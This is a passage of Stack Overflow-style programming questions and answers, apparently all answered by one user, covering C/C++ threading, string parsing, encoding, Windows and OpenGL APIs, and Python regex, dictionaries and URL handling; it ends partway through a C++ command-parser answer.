"<p>I'm trying to work with producer/consumer threads in a bounded buffer. The buffer length is 5. I have 1 mutex and 2 semaphores, empty which starts out at the size of the buffer, and full, which starts out at 0. </p>

<p>When I run my code without sleep() at the end, it continually produces until the buffer is completely fully, the consumes until it's empty, so the output looks like this:</p>

<pre><code>Placed 1 in the buffer at position 0.
Placed 2 in the buffer at position 1.
Placed 3 in the buffer at position 2.
Placed 4 in the buffer at position 3.
Placed 5 in the buffer at position 4.
The buffer now contains 0 at position 0.
The buffer now contains 0 at position 1.
The buffer now contains 0 at position 2.
The buffer now contains 0 at position 3.
The buffer now contains 0 at position 4.
</code></pre>

<p>However, when i run with sleep() at the end, it prints out:</p>

<pre><code>Placed 1 in the buffer at position 0.
The buffer now contains 0 at position 0.
</code></pre>

<p>Then it appears to lock up, but I'm not really sure why it behaves the way it does regardless of whether or not sleep is there. Any suggestions? My main method essentially just makes some declarations then creates 1 thread to produce and 1 to consume, those methods are below.</p>

<pre><code>void *producer()
{
        int k = 0; //producer index
        while (1)
        {
                sem_wait(&amp;empty);
                pthread_mutex_lock(&amp;mutex);
                buffer[k] = k+1;
                sem_post(&amp;full);
                pthread_mutex_unlock(&amp;mutex);
                printf(""Placed %d in the buffer at position %d.\n"", buffer[k], k);
                k = (k + 1) % BUFFER_SIZE;
                sleep(rand() * 10);
        }
}

void *consumer()
{
        int j = 0;   //consumer index
        while(1)
        {
                sem_wait(&amp;full);
                pthread_mutex_lock(&amp;mutex);
                buffer[j] = 0;
                sem_post(&amp;empty);
                pthread_mutex_unlock(&amp;mutex);
                printf(""The buffer now contains %d at position %d.\n"", buffer[j], j);
                j = (j + 1) % BUFFER_SIZE;
                sleep(rand() * 10);

        }
}
</code></pre>
","9530","","<p>The parameter to <code>sleep()</code> is the number of seconds to sleep for.  <code>rand()</code> returns an integer between 0 and <code>RAND_MAX</code> (typically 32767 or 2<sup>31</sup>-1), and when you multiply that by 10, you're sleeping for an absurdly large amount of time.  You're not deadlocking, just sleeping for a very long time.</p>
"
"<p>I've spent so many hours on this I can feel my sanity slowly slipping. So any help would be really truly appreciated.
I'll try and be as succinct as possible.</p>

<p>I have a circle on a 2D plane. I know the cartesian coordinates for it's central point(C) and the radius(R).</p>

<p>My confusion stems from this problem. When provided with a point on the plane outside of the circle; I can calculate the point(P) on the circle's circumference closest to that point.</p>

<p>What I want to do is determine the (x,y) coordinates of 2 points on the circumference. Let's call them P1 and P2. P1 and P2 are two ends of an arc. The arc is of a fixed length(X). P is the midway point between P1 and P2. As such, the arc length from P to P1 &amp; P to P2 are both X/2.</p>

<p>In short:
given C, R, P, X ; I need to calculate P1 and P2.</p>

<p>I am trying to code this in c++ but any suggestions or pseudo-code would be great.</p>

<p>EDIT:
X is an arc length, not a straight line between P1 and P2</p>
","9530","","<p>An arc that subtends an angle of θ (in radians) has an arc length of θR.  So, you want a half-angle of θ = X/(2R).  You then need to take the vector (P -C), rotate it by angles of ±θ, and add back in C to get P1 and P2.  To rotate a vector by an angle, multiply it by a <a href=""http://en.wikipedia.org/wiki/Rotation_matrix"" rel=""nofollow"">rotation matrix</a>.</p>

<p>So, in pseudocode, it would look like this:</p>

<pre><code>θ = X/(2R)
A = 2x2 rotation matrix corresponding to a rotation by θ radians
A' = transpose of A
P1 = C + A * (P - C)
P2 = C - A' * (P - C)
</code></pre>
"
"<p>I have some problems with memory leaks on iPhone (imagine that), and I have a custom object with a retain count of 10. </p>

<p>Is there any way I can know what code triggered the retain count increased for a specific object instance? I am using GHUnit if that matters.</p>
","9530","","<p>The retain counts are nearly useless—if something gets <code>retain</code>ed and <code>autorelease</code>d in a statement, that's perfectly fine, but its retain count will increase by 1.</p>

<p>If you want to find exactly where a particular object is being <code>retain</code>ed, override the class's <code>retain</code> implementation to test for your object(s), and set a breakpoint there:</p>

<pre><code>@implementation MyClass
-(id) retain
{
    if(self == ObjectThatImTracking)
        NSLog(@""[ObjectThatImTracking retain]\n"");  // put a breakpoint here
    return [super retain];
}
</code></pre>

<p>Then run your program in the debugger and look at the call stack when the breakpoint gets hit.</p>
"
"<p>i have been really busy with a project on operating systems recently .. i am working on my macs and everything is going great..when i tried to run the same programm at a pc running linux the programm went terribly wrong...for example fgets and fscanf work fluently at mac but when i try to fgets 2 times in a row from stdin(rewinding the stdin firstly) i dont get what i want on linux even though at my mac evertyhting is running normally as expexted..please help me if i am missing out any information about linux and problems..</p>

<pre><code>void add_new_account(int sd)
{
    int my_id, next_id;
    struct drivers instance; 

    read(sd, &amp;next_id, sizeof(int));
    if (next_id &gt;= 1000) {
        printf(""system is full .. we are sorry for this inconvenience\n"");
        exit(0);
    }

    read(sd, buf, sizeof(buf));
    printf(""%s\n"", buf);

    rewind(stdin);
    fgets(instance.driver_name, sizeof(instance.driver_name), stdin);

    rewind(stdin);
    fgets(instance.password, sizeof(instance.password)+1, stdin);

    write(sd, &amp;instance, sizeof(instance));
    read(sd, &amp;my_id, sizeof(int));
    printf(""your unique id is %d! please save it in order to login with it\n"", my_id);
}
</code></pre>
","9530","","<p>You should not rewind <code>stdin</code>, since it's not guaranteed to work.  It's impossible to say exactly what's happening without seeing any code, but I'm guessing you're trying to rewind <code>stdin</code> with <a href=""http://linux.die.net/man/3/fseek"" rel=""nofollow""><code>fseek</code></a> (or one of its kin such as <a href=""http://linux.die.net/man/3/fseek"" rel=""nofollow""><code>fsetpos</code></a> or <a href=""http://linux.die.net/man/3/fseek"" rel=""nofollow""><code>rewind</code></a>) and that call is failing.</p>

<p>Regular file objects are seekable, but other types of file-like objects such as sockets and FIFOs are usually not seekable.  In your limited case, you're probably observing that Mac OS X is buffering enough data for you to seek it to your liking, but Linux is not doing so.</p>

<p>You should rewrite your program so that you don't need to rewind <code>stdin</code>.  The way you'd do this is by doing your own buffering—read data into a buffer in your application, and then read data out of that buffer (possibly multiple times, if necessary).  Then you don't need to depend on the input stream being rewindable.</p>
"
"<p>why <code>sizeof("""")</code> is equivalent to 1 and <code>sizeof(NULL)</code> is equivalent to 4  in c-language ?</p>
","9530","","<p>The empty string <code>""""</code> has type <code>char[1]</code>, or ""array 1 of <code>char</code>"".  It is <em>not</em> a pointer, as most people believe.  It can <em>decay</em> into a pointer, so any time a pointer to <code>char</code> is expected, you can use an array of <code>char</code> instead, and the array will decay into a pointer to its first element.</p>

<p>Since <code>sizeof(char)</code> is 1 (by definition), we therefore have <code>sizeof("""")</code> is <code>sizeof(char[1])</code>, which is 1*1 = 1.</p>

<p>In C, <code>NULL</code> is an ""implementation-defined null pointer constant"" (C99 §7.17.3).  A ""null pointer constant"" is defined to be an integer expression with the value 0, or such an expression cast to type <code>void *</code> (C99 §6.3.2.3.3).  So the actual value of <code>sizeof(NULL)</code> is implementation-defined: you might get <code>sizeof(int)</code>, or you might get <code>sizeof(void*)</code>.  On 64-bit systems, you often have <code>sizeof(int) == 4</code> and <code>sizeof(void*) == 8</code>, which means <em>you can't depend on what <code>sizeof(NULL)</code> is</em>.</p>

<p>Also note that most C implementations define <code>NULL</code> as <code>((void*)0)</code> (though this is not required by the standard), whereas most C++ implementations just define <code>NULL</code> as a plain <code>0</code>.  <strong>This means that the value of <code>sizeof(NULL)</code> can and will change depending on if code is compiled as C or as C++</strong> (for example, code in header files shared between C and C++ source files).  So do not depend on <code>sizeof(NULL)</code>.</p>
"
"<p>Can I do something like this? I would like to use data types instead of constants in my enum <code>type_t</code>.</p>

<pre><code>typedef struct {
    char id;
    long data;
} type1_t;

typedef struct {
    char id;
    long data;
    float moredata;
} type2_t;

typedef enum {
    type1_t, type2_t
} type_t;

typedef struct {
    type_t type;
    char* something;
} midas;

midas obj1;
obj1.type = type1_t;
obj1.type.id = 0;
obj1.type.data = 123;

midas obj2;
obj2.type = type2_t;
obj2.type.id = 3;
obj2.type.data = 456;
obj2.type.moredata = 3.14;
</code></pre>

<p>In the example the <code>type</code> variable of the <code>midas</code> struct should then refer to <code>type1_t</code> or <code>type2_t</code>. So if I set the type to <code>type2_t</code>, the size of it should be bigger than when I set <code>type1_t</code>.</p>
","9530","","<p>No.  The usual way to do something like this in C is with a union:</p>

<pre><code>typedef enum { TYPE1, TYPE2 } type_t;

typedef struct {
    type_t type;
    union
    {
        type1_1 t1;
        type2_t t2;
    } u;
} midas;

midas obj1;
obj1.type = TYPE1;
obj1.u.t1.id = 0;
obj1.u.t1.data = 123;

midas obj2;
obj2.type = TYPE2;
obj2.u.t2.id = 3;
obj2.u.t2.data = 456;
obj2.u.t2.moredata = 31.14;
</code></pre>
"
"<p><strong>My Objective is</strong> : I want to test a piece of code (or function) performance, just like how I test the correctness of that function in a unit-test, let say that the output of this benchmarking process is a ""function performance index"" which is ""portable""</p>

<p><strong>My Problem is</strong> : we usually benchmarking a code by using a timer to count elapsed time during execution of that code. and that method is depend on the hardware or O/S or other thing.</p>

<p><strong>My Question is</strong> : is there a method to get a ""function performance index"" that is independent to the performance of the host (CPU/OS/etc..), or if not ""independent"" lets say it is ""relative"" to some fixed value. so that somehow the value of ""function performance index"" is still valid on any platform or hardware performance.</p>

<p>for example: that FPI value is could be measured in</p>

<ul>
<li>number of arithmetic instruction needed to execute a single call</li>
<li>float value compared to benchmark function, for example function B has rating index of 1.345 (which is the performance is slower 1.345 times than the benchmark function)</li>
<li>or other value.</li>
</ul>

<p><em><strong>note</strong> that the FPI value doesn't need to be scientifically correct, exact or accurate, I just need a value to give a rough overview of that function performance compared to other function which was tested by the same method.</em></p>
","9530","","<p>No, there is no such thing.  Different hardware performs differently.  You can have two different pieces of code X and Y such that hardware A runs X faster than Y but hardware B runs Y faster than X.  There is no absolute scale of performance, it depends entirely on the hardware (not to mention other things like the operating system and other environmental considerations).</p>
"
"<p>I have a string in a django/python app and need to search it for every instance of <code>[x]</code>. This includes the brackets and x, where x is any number between 1 and several million. I then need to replace x with my own string.</p>

<p>ie, <code>'Some string [3423] of words and numbers like 9898'</code> would turn into <code>'Some string [mycustomtext] of words and numbers like 9898'</code></p>

<p>Note only the bracketed number was affected. I am not familiar with regex but think this will do it for me?</p>
","9530","","<p>Use <a href=""http://docs.python.org/library/re.html#re.sub"" rel=""nofollow""><code>re.sub</code></a>:</p>

<pre><code>import re
input = 'Some string [3423] of words and numbers like 9898'
output = re.sub(r'\[[0-9]+]', '[mycustomtext]', input)
# output is now 'Some string [mycustomtext] of words and numbers like 9898'
</code></pre>
"
"<p>I am doing a project in linux kernel and I wanted to know what does this checkstack.pl do? I have never studied perl so cant understand the program. It will be great if I could understand the program conceptually if not line by line.
Any effort appreciated.</p>

<p>Source:
<a href=""http://lxr.linux.no/#linux+v2.6.36/scripts/checkstack.pl"" rel=""nofollow"">link text</a></p>

<p>suppose i want to write the code of my own tweaking a bit, can i write it in a C program. My main Q is : why this code is written or should be written in perl?</p>
","9530","","<p>It creates a listing of the size of the stack frame used by every function in the kernel (i.e. the total amount of local scratch space used by each function for local variables and whatnot).</p>

<p>The way it does this is by going through the disassembly of the kernel and looking for 2 things: function names and instructions which adjust the stack.  It looks for function names by looking for lines that match <code>$funcre</code> (<code>qr/^$x* &lt;(.*)&gt;:$/</code>), and it looks for stack adjustment instructions that match <code>$re</code> or <code>$dre</code>; the latter two depend highly on what architecture the kernel was compiled for, which is what the first big block if if/else statements is checking for.  <code>$re</code> searches for functions which adjust the stack by a fixed amount (the vast majority of functions), and <code>$dre</code> searches for functions which adjust the stack by a variable amount (rare).</p>

<p><code>objdump</code> is part of <a href=""http://www.gnu.org/software/binutils/"">binutils</a>; <code>objdump -d</code> is the command to disassemble an object file.  The usage of this script is to disassemble the kernel (<code>objdump -d vmlinux</code>) and pipe the output into the script.  The output of the script is a listing of all of the functions in the kernel, sorted by the largest stack frame size.  I assume the purpose of the script is for the kernel maintainers to be able to avoid stack overflows by painfully making sure that the stack frames of everything is as small as possible, and this script allows them to verify this.</p>
"
"<p>I have a codebase that makes extensive use of pthread.h.  On a windows visual studio project, this obviously doesn't work since pthreads is a unix utility.</p>

<p>I know there exists pthread-win32 or something of the sort, but is there a way to have a codebase use this, without replacing all of the pthread code?</p>

<p>edit: I'd prefer to not have to go through and replace all the pthread calls.  This is my question</p>
","9530","","<p>If the code is very heavily *nix-based, you'll probably have the best luck compiling it with <a href=""http://www.cygwin.com/"" rel=""nofollow"">Cygwin</a>+GCC.  If pthreads is the only *nix dependency and you'd like to avoid the Cygwin dependency, then you should go with <a href=""http://sourceware.org/pthreads-win32/"" rel=""nofollow"">Pthreads-win32</a>.</p>
"
"<p>I've been following this tutorial on OpenGL and C++:
<a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=06"" rel=""nofollow"">http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=06</a></p>

<p>...and I've found myself facing quite the error. Whenever I try to compile, my program crashes with an error of the type, System.AccessViolationException. I've isolated the problem to be in this function:</p>

<pre><code>glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage[0]-&gt;sizeX, TextureImage[0]-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage[0]-&gt;data);
</code></pre>

<p>In case you don't want to look through that tutorial, the memory appears to be set up like so:</p>

<pre><code>AUX_RGBImageRec *TextureImage[1];
memset(TextureImage,0,sizeof(void *)*1);
</code></pre>

<p>Any help would be awesome. Thanks.</p>
","9530","","<p>You're crashing because <code>TextureImage[0]</code> is NULL.  The initial <code>memset</code> there sets it to NULL; if you follow along in the tutorial, the next line of code is this:</p>

<pre><code>if (TextureImage[0]=LoadBMP(""Data/NeHe.bmp""))
</code></pre>

<p>Note carefully that there is a <em>single</em> <code>=</code> sign here, not a double <code>==</code> as you'd normally see (you may even get a compiler warning here; to suppress that, add extra parentheses around the assignment)).  Make sure you copied this line of code correctly and that you have a single <code>=</code> here.</p>

<p>If in fact you do have a single <code>=</code>, then check to make sure that <code>LoadBMP</code> is returning a non-NULL value.  If it's returning NULL, the most likely cause is that it can't find the bitmap file <code>Data/NeHe.bmp</code>, either because it doesn't exist or it's looking for it in the wrong directory.  Make sure your current working directory is set up correctly so that it can find the image.</p>
"
"<p>I have a dict with following structure:</p>

<pre><code>{5:""djdj"", 6:""8899"", 7:""998kdj""}
</code></pre>

<p>The key is int typed and it's not sorted.</p>

<p>Now I want all the elements whose key is >= 6.</p>

<p>Is there easy way to do that?</p>
","9530","","<p>You can use a <em>list comprehension</em>:</p>

<pre><code>mydict = {5:""djdj"", 6:""8899"", 7:""998kdj""}
print [k for k in mydict if k &gt;= 6]  # prints ""[6, 7]""
print dict([(k, mydict[k]) for k in mydict if k &gt;= 6])  # prints ""{6:""8899"", 7:""998kdj""}""
</code></pre>
"
"<p>I have an incredibly frustrating crash that only occurs after I press home button and then go back into my app. But once you hit the home button, XCode's debugger is disconnected and receives no more NSLog messages. Is it possible to reenable NSLog after returning to the app?</p>
","9530","","<p>Even when the debugger isn't connected, any output generated via <code>NSLog</code> still gets saved, and then you can look at the console log later using the XCode Organizer.  See also <a href=""http://stackoverflow.com/questions/429205/is-there-a-way-to-capture-the-ouput-of-nslog-on-an-iphone-when-not-connected-to-a"">this question</a>.</p>
"
"<p>I would like to know how can i fetch the a waveform from any music file format in order to visualize it using some kind of gui. i would like to use already written libraries instead of writing my own.</p>

<p>any ideas?</p>

<p>thanks!</p>
","9530","","<p>That depends on the music file format.  <a href=""http://www.spaghetticode.org/lame/"" rel=""nofollow"">LameLib</a> can be used for decoding mp3s, and <a href=""http://www.xiph.org/ogg/"" rel=""nofollow"">libogg</a> can be used for decoding oggs.  Uncompressed wav files don't need to be decoded, since the file stores the raw PCM data; you just need to read in the file headers, and there's lots of sample code out there that shows you how to do that.</p>
"
"<p>Here's what I have so far:</p>

<pre><code>import os.path as op
for d in map(chr, range(98, 123)): #drives b-z
    if not op.isdir(d + ':/'): continue
</code></pre>

<p>The problem is that it pops up a ""No Disk"" error box in Windows:</p>

<blockquote>
  <p>maya.exe - No Disk: There is no disk in
  the drive. Please insert a disk into
  drive \Device\Harddisk1\DR1 [Cancel, Try Again, Continue]</p>
</blockquote>

<p>I can't catch the exception because it doesn't actually throw a Python error.</p>

<p>Apparently, this only happens on removable drives where there is a letter assigned, but no drive inserted.</p>

<p>Is there a way to get around this issue without specifically telling the script which drives to skip?</p>

<p>In my scenario, I'm at the school labs where the drive letters change depending on which lab computer I'm at. Also, I have zero security privileges to access disk management.</p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow""><code>ctypes</code></a> package to access the <a href=""http://msdn.microsoft.com/en-us/library/aa364972%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetLogicalDrives</code></a> function.  This does not require external libraries such as pywin32, so it's portable, although it is a little clunkier to work with.  For example:</p>

<pre><code>import ctypes
import itertools
import os
import string

def get_available_drives():
    if 'Windows' not in platform.system():
        return []
    drive_bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    return list(itertools.compress(string.ascii_uppercase,
               map(lambda x:ord(x) - ord('0'), bin(drive_bitmask)[:1:-1])))
</code></pre>

<p><code>itertools.compress</code> was added in Python 2.7 and 3.1; if you need to support &lt;2.7 or &lt;3.1, here's an implementation of that function:</p>

<pre><code>def compress(data, selectors):
    for d, s in zip(data, selectors):
        if s:
            yield d
</code></pre>
"
"<p>Is there a way to check the number of bytes available from a USB device (printer in our case)?</p>

<p>We're using <a href=""http://msdn.microsoft.com/en-us/library/aa363858%28VS.85%29.aspx"" rel=""nofollow"">CreateFile</a> and <a href=""http://msdn.microsoft.com/en-us/library/aa365467%28VS.85%29.aspx"" rel=""nofollow"">ReadFile</a> and <a href=""http://msdn.microsoft.com/en-us/library/aa365747%28VS.85%29.aspx"" rel=""nofollow"">WriteFile</a> for IO communications with our USB device, which works. But We can't figure out how much data is available without actually doing a read. We can't use <a href=""http://msdn.microsoft.com/en-us/library/aa364955%28VS.85%29.aspx"" rel=""nofollow"">GetFileSize</a>, as even the documentation says you can't use it for a :</p>

<blockquote>
  <p>""nonseeking device such as a pipe or a communications device""...</p>
</blockquote>

<p>So that doesn't work.  Any suggestions? Are we doing our USB I/O incorrectly? Is there a better way to Read/Write to USB?</p>
","9530","","<p>You first need to open up the port in asynchronous mode.  To do that, pass the flag <code>FILE_FLAG_OVERLAPPED</code> to <code>CreateFile</code>.  Then, when you call <code>ReadFile</code>, pass in a pointer to an <a href=""http://msdn.microsoft.com/en-us/library/ms684342%28v=VS.85%29.aspx"" rel=""nofollow""><code>OVERLAPPED</code></a> structure.  This does an asynchronous read and immediately returns <code>ERROR_IO_PENDING</code> without blocking (or, if the OS already has the data buffered, you might get lucky and get a successful read -- be prepared to handle that case).</p>

<p>Once the asynchronous I/O has started, you can then periodically check if it has completed with <a href=""http://msdn.microsoft.com/en-us/library/ms683209%28v=VS.85%29.aspx"" rel=""nofollow""><code>GetOverlappedResult</code></a>.</p>

<p>This allows you to answer the question ""are X bytes of data available?"" for a particular value of X (the one passed to <code>ReadFile</code>).  95% of the time, that's good enough, since you're looking for data in a particular format.  The other 5% of the time, you'll need to add another layer of abstraction top, where you keep doing asynchronous reads and store the data in a buffer.</p>

<p>Note that asynchronous I/O is very tricky to get right, and there's a lot of edge cases to consider.  Carefully read all of the documentation for these functions to make sure your code is correct.</p>
"
"<p>I want to be able to take a shortened or non-shortened URL and return its un-shortened form. How can I make a python program to do this?</p>

<p>Additional Clarification:</p>

<p>Case 1: shortened --> unshortened <br />
Case 2: unshortened --> unshortened </p>

<p>e.g. bit.ly/silly in the input array should be google.com in the output array <br />
e.g. google.com in the input array should be google.com in the output array</p>

<p>Thanks for the help!</p>
","9530","","<p>Send an HTTP HEAD request to the URL and look at the response code.  If the code is 30x, look at the <code>Location</code> header to get the unshortened URL.  Otherwise, if the code is 20x, then the URL is not redirected; you probably also want to handle error codes (4xx and 5xx) in some fashion.  For example:</p>

<pre><code># This is for Py2k.  For Py3k, use http.client and urllib.parse instead, and
# use // instead of / for the division
import httplib
import urlparse

def unshorten_url(url):
    parsed = urlparse.urlparse(url)
    h = httplib.HTTPConnection(parsed.netloc)
    h.request('HEAD', parsed.path)
    response = h.getresponse()
    if response.status/100 == 3 and response.getheader('Location'):
        return response.getheader('Location')
    else:
        return url
</code></pre>
"
"<p>I am atempting to draw text to a textured mesh object. The mesh is basically a cube which has been pasted up to the front of the screen. (overall I'm aiming for a menu system). After a bit of googling I've found surprisingly little information on how to draw a text to a texture. I've read that it should be as simple as making a texture, setting it as a render source and then drawing to it, yet I cannot figure this one out.</p>

<p>Any ideas, suggestions or skeleton code with the necessary function calls to give me a jump start?</p>
","9530","","<p>See the section ""Rendering to a texture"" in <a href=""http://msdn.microsoft.com/en-us/library/bb205131%28v=VS.85%29.aspx"" rel=""nofollow"">Creating Texture Resources</a> for some very helpful documentation.  That provides several snippets of example code that should help you get on your way.</p>
"
"<p>I'm trying to open a file, and read from it.. but I'm having some issues.</p>

<pre><code>FILE *libFile = fopen(""/Users/pineapple/Desktop/finalproj/test242.txt"",""r"");
char wah[200];
fgets(wah, 200, libFile);
printf(""%s test\n"", wah);
</code></pre>

<p>this prints: \377\376N test    rather than any of the contents of my file.</p>

<p>any idea why?</p>

<p>complete code:</p>

<pre><code>#import &lt;Cocoa/Cocoa.h&gt;
#import &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];

FILE *libFile = fopen(""/Users/pineapple/Desktop/finalproj/test242.txt"",""r"");
if(libFile){
char wah[200];
fgets(wah, 200, libFile);
printf(""%s test\n"", wah);
    }
[pool drain];
return 0;

}
</code></pre>

<p>And the test242.txt doesn't contain more than 200 chars.</p>
","9530","","<p>Your file is stored in <a href=""http://en.wikipedia.org/wiki/UTF-16"">UTF-16</a> (Unicode).  The first character in your file is ""L"", which is code point 0x4C.  The first 4 bytes of your file are <code>FF FE 4C 00</code>, which are a byte-order mark (BOM) and the letter L encoded in UTF-16 as two bytes.</p>

<p><a href=""http://linux.die.net/man/3/fgets""><code>fgets</code></a> is not Unicode-aware, so it's looking for the newline character <code>'\n'</code>, which is the byte 0x0A.  Most likely this will happen on the first byte of a Unicode newline (the two bytes <code>0A 00</code>), but it could also happen on plenty of other non-newline characters such as U+010A (LATIN CAPITAL LETTER A WITH DOT ABOVE) or anything in the Gurmukhi or Gujarati scripts (U+0A00 to U+0AFF).</p>

<p>In any case, though, the data that's ending up in the buffer <code>wah</code> has lots of embedded nulls and looks something like <code>FF FE 4C 00 47 00 4F 00 4F 00 0A 00</code>.  NUL (0x00) is the C string terminator, so when you attempt to print this out using <code>printf</code>, it stops at the first null, and all you see is <code>\377\376L</code>.  <code>\377\376</code> is the octal representation of the bytes <code>FF FE</code>.</p>

<p>The fix for this is to convert your text file to a single-byte encoding such as ISO 8859-1 or UTF-8.  Note that must single-byte encodings (UTF-8 excepted) cannot encode the full range of Unicode characters, so if you need Unicode, I strongly recommend using UTF-8.  Alternatively, you can convert your program to be Unicode-aware, but then you can no longer use a lot of standard library functions (such as <code>fgets</code> and <code>printf</code>), and you need to use <code>wchar_t</code> everywhere in place of <code>char</code>.</p>
"
"<p>I know how to send signals to child process in C using the <code>kill(pid_t pid, int sig)</code> function. What about sending signals to threads? is it possible?. If so, how to catch signals on the ""child"" thread. For example, if the main thread sends me a terminate signal, how can I in the other thread catch it.  </p>
","9530","","<p>Signals do not have thread affinity.  They are handled completely asynchronously.  When you specify a signal handler with <code>signal(2)</code> or <code>sigaction(2)</code>, it's a global signal handler.  When a signal is raised, the signal handler runs on top of the stack of whatever thread happens to be running at the time, and you can't control that.</p>

<p>It sounds like you want some other sort of interthread communication.  The simplest way to do this is with a <code>volatile</code> shared variable:</p>

<pre><code>volatile bool should_terminate = false;

void ChildThread()
{
    while(!should_terminate)
    {
        // do stuff
    }
}

void MainThread()
{
    // To terminate child thread:
    should_terminate = true;
}
</code></pre>

<p>If you need stronger concurrency control, look into mutexes, condition variables, and semaphores.</p>
"
"<p>Are there any good sources containg C++ versions of MATLAB functions?  I am only looking for some basic functions i.e. fzero.</p>
","9530","","<p>Try looking at <a href=""http://www.gnu.org/software/octave/"" rel=""nofollow"">GNU Octave</a>.  It's a FLOSS alternative to MATLAB and has a lot of the same functionality.  Take a look at its implementation of <code>fzero</code>, keeping in mind that the code is GPL'ed.</p>
"
"<p>I have a string with multiple lines and I want to use sscanf to match particular parts of it.  It only seems to work however on matching data contained within the first line.</p>

<p>For example, If I have the string:</p>

<blockquote>
  <p>""age1: x \r\n
  age2: x""</p>
</blockquote>

<p>And using sscanf:</p>

<blockquote>
  <p>sscanf(string, ""age1: %d"", &amp;i); - this works <br />
  sscanf(string, ""age2: %d"", &amp;j); - however this doesn't.</p>
</blockquote>

<p>Any ideas?</p>
","9530","","<p>As others have stated, <code>sscanf</code> doesn't remember how much data was read and advance the input data like <code>scanf</code> and <code>fscanf</code> do.  Use the <code>%n</code> specifier to remember how much data was read, and advance the input yourself:</p>

<pre><code>int bytesRead;
if(sscanf(string, ""age 1: %d\n%n"", &amp;i, &amp;bytesRead) == 1) &amp;&amp;
   sscanf(string + bytesRead, ""age 2: %d"", &amp;j) == 1)
{
    // success
}
else
{
    // parsing failed
}
</code></pre>

<p>The <code>%n</code> specifier says ""tell me how many bytes of input have been read up to this point, and store it in the next argument (which must be a pointer to an <code>int</code>)"".  By putting it at the end of the format string, we can figure out how much input was parsed.  Also note that I added a newline after the <code>%d</code> so that we eat the whitespace after the first integer; otherwise when we attempted to read <code>""age 2""</code>, it would see a newline next instead of the character <code>a</code>, and parsing would fail because that's not a match.</p>
"
"<p>when I build my source code in  linux  I got an error like 
qstring.cpp:(.text+0x2c01): undefined reference to `terminate(void)'
collect2: ld returned 1 exit status</p>

<p>How to solve this problem?</p>
","9530","","<p><code>terminate</code> is defined in the C++ standard library, so make sure that you're linking that in.  Assuming you're using gcc to compile, you should use the <code>g++</code> executable to compile your source code, <em>not</em> the <code>gcc</code> executable:</p>

<pre><code>g++ source.cc -o output
</code></pre>

<p>When executed as <code>g++</code>, the linker automatically links in the C++ standard library (libstdc++) for you.  If you instead execute gcc as plain <code>gcc</code>, or you directly invoke the linker <code>ld</code>, then you need to add <code>-lstdc++</code> yourself to link in the library, e.g.:</p>

<pre><code>gcc source.cc -o output -lstdc++  # Compile directly from source
ld source1.o source2.o -o output -lstdc++  # Link together object files
</code></pre>
"
"<p>I am using <code>wcstombs_s</code> in my code to convert <code>CString</code> to <code>char*</code>. here is code:</p>

<pre><code>  AddItemToListIncludeSubFolder(CString FolderPath, CString Parent)
  {
    char szInputPath[1024]; 

    memset(szInputPath,1024,'\0');
    size_t CharactersConverted=0;

    wcstombs_s(&amp;CharactersConverted, szInputPath, FolderPath.GetLength()+1, 
        FolderPath, _TRUNCATE);
  }
</code></pre>

<p>It raises exception some time. Memory exception. is <code>wcstombs_s</code> is not working when <code>CString</code> is too long like 1024 character or I am doing something wrong.</p>
","9530","","<p>The third parameter of <code>wcstombs_s</code> is the size of the output buffer, <em>not</em> the size of the string to be converted.  If <code>FolderPath</code> is longer than 1024 characters, you're writing memory out of bounds because <code>wcstombs_s</code> thinks it has a bigger buffer than it does.</p>

<p>Try this instead:</p>

<pre><code>wcstombs_s(&amp;CharactersConverted, szInputPath, sizeof(szInputPath),
    FolderPath, _TRUNCATE);
</code></pre>
"
"<p>I need some help with C++, please!</p>

<p>I'm writing a command parser for a small text-based game, and I've run into some problems. The parser is supposed to read and parse commands entered by the player. </p>

<p>The most obvious and straightforward solution to this could be something like this (written in pseudo-code):</p>

<pre><code>command &lt;- read input from the player
if command == COMMAND1
    do command1
else if command == COMMAND 2
    do command2
...
</code></pre>

<p>I'm writing in C++, so I was thinking I could solve this by using an associative map and function pointers. I'm not that familiar with using functions pointers, so that may be why I'm having problems. What I want to do, is to have some sort of loop that waits for input, parse the input that is inserted, and calls a function depending on the command given. Here's some C++-ish pseudo-code describing what I am thinking:</p>

<pre><code>while(1) {
 cin &gt;&gt; input;
 char * tok = strtok(input, "" "")
 functionpointer fptr = command_map.find(tok);
 ... // here, I get stuck on what to do..
}
</code></pre>

<p>So I hope I make myself somewhat clear on what I want to happen. The player could have had input something like</p>

<pre><code>&gt; go south
</code></pre>

<p>and I could have finished the code with something like:</p>

<pre><code>destination = strtok(NULL, "" "");
fptr(destination);
</code></pre>

<p>Basically, the value returned from the map would be the function that performs the command ""go"", and that function apparently takes one argument, the destination. Again, this is some C++-pseudo-ish code. So I got the command ""go"" covered. But now say that I want to have the follwing command:</p>

<pre><code>&gt; attack troll with sword
</code></pre>

<p>Now I feel that I need to do something like:</p>

<pre><code>while(1) {
 cin &gt;&gt; input;
 char * tok = strtok(input, "" "")
 functionpointer fptr = command_map.find(tok);
 if(tok == ""go""){
    destination = strtok(NULL, "" "");
    fptr(destination);
 } else if (tok == ""attack"") {
    target = strtok(NULL, "" "");
    weapon = strtok(NULL, "" "");
    fptr(target, weapon);
   }
}
</code></pre>

<p>Again, this is pseudo-code. You probably see what I get hung up on: I have this map of functions pointers, but because I have variable number of arguments and type of arguments because I want to call different functions depending on what I got as the input, so I could've just done this without a map and function pointers like I showed you first. Is there some way I can make this more general, without having to have some if-else clause to figure out how many arguments to pass?</p>

<p>I hope you understand what I need help with :) Thank you for reading!</p>
","9530","","<p>A better solution would be to have all of your functions take the same arguments.  A good idea would be to first completely tokenize your input (say, into a vector of strings), and then pass that array to the functions.  You could then use an associative container (such as a hash table or a <code>std::map</code>) to map command tokens to handler functions.</p>

<p>For example:</p>

<pre><code>typedef std::vector&lt;std::string&gt; TokenArray;
typedef void (*CommandHandler)(const TokenArray&amp;);
typedef std::map&lt;std::string, CommandHandler&gt; CommandMap;
void OnGo(const TokenArray&amp; tokens)
{
    // handle ""go"" command
}
void OnAttack(const TokenArray&amp; tokens)
{
    // handle ""attack"" command
}
// etc.

